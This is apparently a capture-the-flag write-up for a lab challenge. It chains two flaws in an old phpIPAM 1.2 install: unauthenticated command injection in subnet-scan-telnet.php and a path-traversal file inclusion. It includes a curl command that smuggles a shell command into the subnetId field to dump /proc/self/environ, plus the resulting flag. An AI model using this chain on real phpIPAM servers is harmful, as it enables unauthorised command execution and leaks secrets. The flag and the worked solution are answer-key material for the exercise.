LORE: Chapter 2: Origins
======================================

## Task
Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at http://intro.lore.tcc.

## Solution

Opening this part of LORE challenges opens phpipam application. Version 1.2 which as we can check it's pretty old. And it has a large number of security bugs, so much that is hard to pick the right ones :-) My favourites for solving rest of LORE challenges including this one was these:
- /app/subnets/scan/subnet-scan-telnet.php is running shell command without sanitized input. This means that with correct POST data we can run any shell command, even without authentication to phpipam app
- A lot of pages are including php files which are set in GET attribute. If we combine this with previous bug, we can generate any PHP file in /tmp and then show it (and what is even better, execute it as PHP) for example with this URL: http://pimpam.lore.tcc/app/dashboard/widgets/index.php?section=../../../../../../tmp/test

So, we can solve this same way like previous LORE challenge. Run this command to get /proc/self/environ file:

```
curl -v -XPOST http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php -d port=22 -d subnetId="; cat /proc/self/environ > /tmp/test.php"
```

and open in browser this link: http://pimpam.lore.tcc/app/dashboard/widgets/index.php?section=../../../../../../tmp/test

And we can see flag: FLAG=FLAG{V51j-9ETA-Swya-8cOR}